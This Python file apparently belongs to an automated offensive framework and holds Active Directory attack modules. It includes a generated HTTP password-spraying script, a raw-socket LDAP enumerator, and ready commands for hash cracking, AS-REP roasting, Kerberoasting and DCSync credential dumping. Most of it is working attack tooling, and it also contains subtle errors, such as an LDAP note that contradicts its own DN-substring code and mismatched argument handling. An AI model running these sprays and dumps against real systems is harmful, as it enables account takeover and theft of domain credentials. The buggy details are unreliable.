"""Attack modules: auth_creds."""

from __future__ import annotations

from tools.attack_modules.base import AttackModule, ModuleContext
import json
from typing import Any

class CredentialSpray(AttackModule):
    name = "CredentialSpray"
    description = "Password spraying against multiple services"
    target_services = ["ssh", "smb", "microsoft-ds", "http", "https", "rdp", "ms-wbt-server"]
    target_ports = [22, 445, 80, 443, 3389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Grid spray (many users x many passwords) -- HIGH lockout risk. "
                "Check lockoutThreshold via ADLDAPEnum first. Prefer PasswordSpray "
                "(one password, many users) for lockout-safe spraying. "
                "crackmapexec is Linux-only; on Windows chain to the password_spray "
                "MCP tool (stdlib HTTP)."
            ),
            evidence=[f"credential spray planned against {ctx.target_ip}"],
            references=["https://www.thehacker.recipes/a-d/movement/credentials/spraying"],
            suggested_command=f"crackmapexec smb {ctx.target_ip} -u users.txt -p passwords.txt --continue-on-success",
            prerequisites=["lockout policy checked (lockoutThreshold via ADLDAPEnum)", "user list from ADLDAPEnum/SMBNullSession"],
        )


# ---------------------------------------------------------------------------
# Privilege Escalation Modules
# ---------------------------------------------------------------------------

class PasswordSpray(AttackModule):
    name = "PasswordSpray"
    description = "Spray one password across many accounts to avoid lockout (spray-and-pray)"
    target_services = ["http", "https", "ssh", "smb", "microsoft-ds", "rdp", "ms-wbt-server"]
    target_ports = [80, 443, 22, 445, 3389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Sprays common passwords across many usernames. Low-and-slow to "
                "avoid lockouts. For AD/SMB targets prefer the password_spray MCP "
                "tool (nxc-based); this script targets web /api/login."
            ),
            # Phase 3: a successful spray yields credentials -- declare the
            # finding shape so record_success surfaces it.
            "credentials_found": ["<VALID_CREDS: printed by script on SUCCESS>"],
            "evidence": [f"password spray queued against {ctx.target_ip}"],
            "references": ["https://www.thehacker.recipes/a-d/movement/credentials/spraying"],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Password Spray Attack — one password, many users, low-and-slow."""
import concurrent.futures, json, sys, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
DELAY = 2.0  # Seconds between attempts to avoid lockout

# Common usernames (expand based on recon)
USERS = [
    "admin", "administrator", "root", "user", "test", "guest",
    "info", "support", "sales", "marketing", "hr", "finance",
    "manager", "developer", "dev", "ops", "backup", "service",
    "sa", "postgres", "mysql", "oracle", "tomcat", "jenkins",
]

# Common spray passwords (seasonal + defaults)
PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Spring2026", "Summer2026", "May2026", "April2026",
    "Changeme123", "Password@123", "Admin@123", "Company@123",
    "P@ssw0rd", "P@ssw0rd123", "Qwerty123", "Admin123!",
]

def try_login(username: str, password: str) -> dict:
    """Attempt a single login."""
    data = json.dumps({{"username": username, "password": password}}).encode()
    try:
        req = urllib.request.Request(
            f"{{BASE}}/api/login",
            data=data,
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read(2048).decode(errors="replace")
            return {{"username": username, "password": password, "status": resp.status, "success": True, "body": body[:200]}}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        # 401/403 = valid user, wrong password. 200/302 = success.
        if e.code in (200, 302):
            return {{"username": username, "password": password, "status": e.code, "success": True, "body": body[:200]}}
        return {{"username": username, "password": password, "status": e.code, "success": False}}
    except Exception as e:
        return {{"username": username, "password": password, "error": str(e)}}

print(f"=== Password Spray: {{BASE}} ===\\n")
print(f"Users: {{len(USERS)}}, Passwords: {{len(PASSWORDS)}}, Delay: {{DELAY}}s\\n")

found = []
for password in PASSWORDS:
    print(f"\\n[Spray] Password: {{password}}")
    for username in USERS:
        result = try_login(username, password)
        status = result.get("status", "?")
        print(f"  {{username}}:{{password}} -> {{status}}", end="")
        if result.get("success"):
            print(" [SUCCESS!]")
            found.append(result)
        else:
            print("")
        time.sleep(DELAY)

if found:
    print(f"\\n[+] {{len(found)}} valid credentials found:")
    for f in found:
        print(f"  {{f['username']}} / {{f['password']}}")
else:
    print("\\n[-] No valid credentials found.")

print("\\n[!] For larger sprays, use crackmapexec or o365spray for O365/Azure targets.")
'''

class HashCrack(AttackModule):
    name = "HashCrack"
    description = "Wrapper around hashcat/john with rule-based mutations for captured hashes"
    target_services = ["smb", "microsoft-ds", "ssh", "http", "https"]
    target_ports = [445, 22, 80, 443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Cracks NTLM, NetNTLMv1/v2, Kerberos TGS, MD5, SHA, bcrypt, and "
                "more. LOCAL-ONLY utility (no target touch) -- chain from "
                "DumpHashes/DCSync/Kerberoasting/ASREPRoast. Prefer the "
                "run_hash_crack MCP tool which auto-identifies the mode via "
                "_identify_hash_modes; cracked plaintext feeds cred_store_add "
                "then PassTheHash/GoldenTicket."
            ),
            evidence=["<CRACKED_POT: exploit_workspace/<ip>/<attempt>/hash.txt.potfile>"],
            references=["https://hashcat.net/wiki/doku.php?id=example_hashes"],
            suggested_commands=[
                f"run_hash_crack(hash_value='<hash>', tool='hashcat')  # auto-identifies mode",
                f"hashcat -m 1000 -a 3 ntlm_hashes.txt ?l?l?l?l?l?l?l?l",
                f"hashcat -m 5600 -a 0 netntlmv2_hashes.txt rockyou.txt -r best64.rule",
                f"john --wordlist=rockyou.txt --rules hashes.txt",
            ],
            hash_modes={
                "0": "MD5",
                "1000": "NTLM",
                "13100": "Kerberos 5 TGS-REP etype 23",
                "5600": "NetNTLMv2",
                "18200": "Kerberos 5 AS-REP etype 23",
                "3200": "bcrypt",
            },
        )


# ---------------------------------------------------------------------------
# Active Directory / Kerberos modules
# ---------------------------------------------------------------------------
# These wrap the existing permissive MCP tools (kerberoast, dump_credentials,
# lateral_exec) -- they are recipe/orchestration modules, not re-implementations.
# Every generated script connects ONLY to ctx.target_ip (the single owned
# target) or operator-box callback hosts expressed as parameters.

class ASREPRoast(AttackModule):
    name = "ASREPRoast"
    description = "AS-REP Roasting: request TGTs for accounts with 'Do not require Kerberos preauthentication' and crack the offline-extractable encrypted payload"
    target_services = ["kerberos"]
    target_ports = [88, 389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "AS-REP roasts accounts with UF_DONT_REQUIRE_PREAUTH set. "
                "Offline crackable via hashcat -m 18200. Chain: ADLDAPEnum "
                "(preauth-disabled candidates) -> asrep_roast -> run_hash_crack "
                "-> PassTheHash."
            ),
            evidence=["<ASREP_HASHES_FILE: exploit_workspace/<ip>/<attempt>/asrep_hashes.txt>"],
            references=[
                "https://posts.specterops.io/kerberoasting-and-as-rep-roasting-a1f1ec0ec0ec",
                "https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py",
                "https://hashcat.net/wiki/doku.php?id=example_hashes (mode 18200)",
            ],
            suggested_command=(
                f"impacket-GetNPUsers -dc-ip {ctx.target_ip} -request "
                f"DOMAIN/user:password -format hashcat -usersfile users.txt"
            ),
            workflow=[
                "1. Gather a username list (ADLDAPEnum output) to feed candidates.",
                f"2. Call asrep_roast(target_ip='{ctx.target_ip}', domain=<d>, username=<u>, password=<p> or ntlm_hash=<nt>, users_file=<from ADLDAPEnum>) -- writes asrep_hashes.txt.",
                "3. Call run_hash_crack(hash_value=<each $krb5asrep$23$... line>, tool='hashcat') -- auto-identifies mode 18200.",
                "4. Cracked plaintext -> cred_store_add -> PassTheHash / lateral_exec against the owned target only.",
            ],
        )


class Kerberoasting(AttackModule):
    name = "Kerberoasting"
    description = "Kerberoasting: request TGS tickets for SPN-backed accounts and crack the offline-extractable service-ticket hash (etype 23 / RC4-HMAC)"
    target_services = ["kerberos"]
    target_ports = [88, 389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Wraps the existing kerberoast MCP tool. TGS-REP etype 23 cracks "
                "with hashcat -m 13100. Crackable only when SPN accounts permit "
                "RC4-HMAC (etype 23); AES-only (etype 17/18) tickets are not "
                "practically crackable -- check userAccountControl for "
                "UF_USE_DES_KEY_ONLY (0x200000) via ADLDAPEnum first."
            ),
            evidence=["<TGS_HASHES_FILE: exploit_workspace/<ip>/<attempt>/kerberoast_tickets.txt>"],
            references=[
                "https://harmj0y.medium.com/kerberoasting-0ce2de1ec0ec",
                "https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py",
                "https://hashcat.net/wiki/doku.php?id=example_hashes (mode 13100)",
            ],
            suggested_command=(
                f"impacket-GetUserSPNs -request -dc-ip {ctx.target_ip} "
                f"DOMAIN/user:password -format hashcat"
            ),
            workflow=[
                f"1. Call kerberoast(target_ip='{ctx.target_ip}') to request TGS tickets for all SPN-backed service accounts from the domain controller.",
                "2. The MCP tool writes TGS-REP hashes (hashcat format) into the per-target workspace exploit_workspace/{ctx.target_ip}/.",
                "3. Call run_hash_crack(hash_value=<each $krb5tgs$23$... line>, tool='hashcat') -- auto-identifies mode 13100. Cracked plaintext -> cred_store_add -> lateral_exec / PassTheHash.",
                "4. Service accounts are frequently over-privileged -- escalate recovered plaintext via lateral_exec / dump_credentials against the owned target only.",
            ],
        )


class DCSyncAttack(AttackModule):
    name = "DCSyncAttack"
    description = "DCSync: impersonate a Domain Controller via the DRSUAPI MS-DRSR interface to pull all NTLM hashes / Kerberos keys from the domain (requires Replication-Get-Changes rights)"
    target_services = ["ldap", "microsoft-ds", "smb", "drsuapi"]
    target_ports = [389, 445, 3268, 135]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Wraps dump_credentials MCP tool (DCSync via impacket secretsdump "
                "over DRSUAPI). Needs an account with DS-Replication-Get-Changes / "
                "Get-Changes-All privileges. DCSync = domain compromise: "
                "privilege_level=admin."
            ),
            evidence=[
                "<NTDS_HASHES_FILE: exploit_workspace/<ip>/<attempt>/ntds_hashes.ntds>",
                "<KRBGTGT_NT: from -just-dc-user krbtgt>",
                "<DOMAIN_SID: from secretsdump>",
            ],
            references=[
                "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
                "https://adsecurity.org/?p=1729 (Mimikatz DCSync explanation)",
                "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr",
            ],
            suggested_command=(
                f"impacket-secretsdump DOMAIN/user:password@{ctx.target_ip} "
                f"-just-dc -outputfile ntds_hashes"
            ),
            privilege_level="admin",
            workflow=[
                "1. Obtain a credential with replication rights (recovered from ASREPRoast / Kerberoasting / credential dump of an over-privileged account on the owned target).",
                f"2. Call dump_credentials(target_ip='{ctx.target_ip}', method='dcsync') to invoke impacket-secretsdump over DRSUAPI against the domain controller. For GoldenTicket: dump_credentials(method='dcsync', target_user='krbtgt').",
                "3. The MCP tool writes NTDS.dit hashes (NTLM, Kerberos keys, LM, password history) into exploit_workspace/<target>/.",
                "4. Crack -> run_hash_crack(hash_value=<NT>, tool='hashcat') (mode 1000) -> cred_store_add. PtH -> PassTheHash. GoldenTicket -> golden_ticket(krbtgt_hash=<from -just-dc-user krbtgt>, sid=<from secretsdump>).",
            ],
        )


class ADLDAPEnum(AttackModule):
    name = "ADLDAPEnum"
    description = "Anonymous/credentialled LDAP enumeration of Active Directory: users, groups, SPNs, and Domain Admins against the owned DC"
    target_services = ["ldap"]
    target_ports = [389, 3268, 636, 3269]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Pure-stdlib LDAP enumerator. Targets only ctx.target_ip. Feeds "
                "username lists into ASREPRoast / Kerberoasting. Captures "
                "sAMAccountName / servicePrincipalName / userAccountControl so "
                "preauth-disabled and SPN-backed accounts are classified by "
                "attribute, not DN substring."
            ),
            "credentials_found": [
                "<USERS_FILE: ...>",
                "<SPN_ACCOUNTS_FILE: ...>",
                "<PREAUTH_DISABLED_FILE: ...>",
            ],
            "evidence": [f"LDAP enumeration queued against {ctx.target_ip}"],
            "references": [
                "https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py",
                "https://ldap.com/ldapv3-wire-protocol-reference/",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Active Directory LDAP enumeration against the owned target.

Pure-stdlib (socket + hand-rolled BER/ASN.1) -- no third-party deps required.
Connects ONLY to the single owned target. For richer output, impacket's
GetADUsers.py / windapsearch / ldap3 provide higher-level tooling.

Usage: python ad_ldap_enum.py [target_host] [bind_dn] [bind_password]
  target_host defaults to {ctx.target_ip} (the owned DC).
"""
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 389
BIND_DN = sys.argv[3] if len(sys.argv) > 3 else ""    # "" = anonymous bind
BIND_PW = sys.argv[4] if len(sys.argv) > 4 else ""

# --- minimal BER / ASN.1 helpers -------------------------------------------
def _ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    out = []
    while n:
        out.insert(0, n & 0xFF)
        n >>= 8
    return bytes([0x80 | len(out)]) + bytes(out)

def _tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _ber_len(len(value)) + value

def _seq(value: bytes) -> bytes:    # SEQUENCE 0x30
    return _tlv(0x30, value)

def _int(n: int) -> bytes:          # INTEGER 0x02
    if n == 0:
        body = b"\\x00"
    else:
        body = []
        v = n
        while v:
            body.insert(0, v & 0xFF)
            v >>= 8
        if body[0] & 0x80:
            body.insert(0, 0x00)
        body = bytes(body)
    return _tlv(0x02, body)

def _octet(s) -> bytes:             # OCTET STRING 0x04
    return _tlv(0x04, s.encode() if isinstance(s, str) else s)

def _enum(n: int) -> bytes:         # ENUMERATED 0x0A
    return _tlv(0x0A, _int(n)[2:])  # strip INTEGER tag, reuse length+body

def _bool(b: bool) -> bytes:        # BOOLEAN 0x01
    return _tlv(0x01, b"\\x01" if b else b"\\x00")

# --- LDAP message framing --------------------------------------------------
_MSGID = [0]
def _ldap(op_bytes: bytes) -> bytes:
    _MSGID[0] += 1
    return _seq(_int(_MSGID[0]) + op_bytes)

def bind_request() -> bytes:
    # BindRequest [APPLICATION 0] := SEQUENCE {{ version, name, auth }}
    body = _int(3) + _octet(BIND_DN) + _tlv(0x80, BIND_PW.encode())  # auth simple [0]
    return _ldap(_tlv(0x60, body))  # [APPLICATION 0] -> 0x60

def search_request(base: str, scope: int = 2) -> bytes:
    # SearchRequest [APPLICATION 3] := base, scope, deref, sizes, times, typesOnly, filter, attrs
    filt = _tlv(0x87, b"")          # filter present [7] = "objectClass"
    filt = _tlv(0xA0, _tlv(0x87, b"objectClass"))  # filter 'and' with present objectClass
    attrs = _seq(_octet("*"))
    body = (_octet(base) + _enum(scope) + _enum(0) + _int(0) + _int(0) +
            _bool(False) + filt + attrs)
    return _ldap(_tlv(0x63, body))  # [APPLICATION 3] -> 0x63

def recv_msg(sock: socket.socket) -> bytes:
    head = sock.recv(2)
    if len(head) < 2:
        return b""
    tag, first = head[0], head[1]
    if first & 0x80:
        nlen = first & 0x7F
        ln = int.from_bytes(sock.recv(nlen), "big")
    else:
        ln = first
    data = b""
    while len(data) < ln:
        chunk = sock.recv(ln - len(data))
        if not chunk:
            break
        data += chunk
    return head + data

def parse_entries(blob: bytes):
    """Best-effort scrape of SearchResultEntry [APPLICATION 4] payloads."""
    i = 0
    entries = []
    while i < len(blob) - 2:
        if blob[i] == 0x64:  # [APPLICATION 4] SearchResultEntry
            # find objectName OCTET STRING (0x04) after length
            j = i + 1
            if j >= len(blob):
                break
            if blob[j] & 0x80:
                j += (blob[j] & 0x7F) + 1
            else:
                j += 1
            # objectName
            if j < len(blob) and blob[j] == 0x04:
                k = j + 1
                if blob[k] & 0x80:
                    ol = int.from_bytes(blob[k+1:k+1+(blob[k] & 0x7F)], "big")
                    k += 1 + (blob[k] & 0x7F)
                else:
                    ol = blob[k]
                    k += 1
                dn = blob[k:k+ol].decode(errors="replace")
                entries.append(dn)
                i = k + ol
                continue
        i += 1
    return entries

def main() -> None:
    print(f"=== AD LDAP Enum against {{HOST}}:{{PORT}} (owned target) ===")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((HOST, PORT))
    print(f"[+] Connected to {{HOST}}:{{PORT}}")
    sock.sendall(bind_request())
    print("[+] Bind request sent (anonymous)" if not BIND_DN else "[+] Bind request sent (credentialled)")
    recv_msg(sock)  # BindResponse [APPLICATION 1]
    # Subtree search from root DSE-style empty base; scope=2 (wholeSubtree)
    sock.sendall(search_request("", scope=2))
    print("[+] Search request sent (objectClass=*)")
    blob = b""
    while True:
        msg = recv_msg(sock)
        if not msg:
            break
        blob += msg
        if msg[0] == 0x65:  # SearchResultDone [APPLICATION 5]
            break
    entries = parse_entries(blob)
    print(f"\\n[+] Discovered {{len(entries)}} directory objects:")
    users, groups, spns, admins = [], [], [], []
    for dn in entries:
        low = dn.lower()
        if "cn=users" in low or ",ou=" in low:
            users.append(dn)
        if "cn=groups" in low:
            groups.append(dn)
        if "spn" in low or "service" in low:
            spns.append(dn)
        if "domain admins" in low or "admin" in low:
            admins.append(dn)
    for label, items in (("Users", users), ("Groups", groups),
                         ("SPN accounts", spns), ("Domain Admins", admins)):
        print(f"\\n-- {{label}} ({{len(items)}}) --")
        for it in items[:50]:
            print(f"  {{it}}")
    sock.close()
    print("\\n[*] Feed the Users list into ASREPRoast / Kerberoasting against the same target.")

if __name__ == "__main__":
    main()
'''

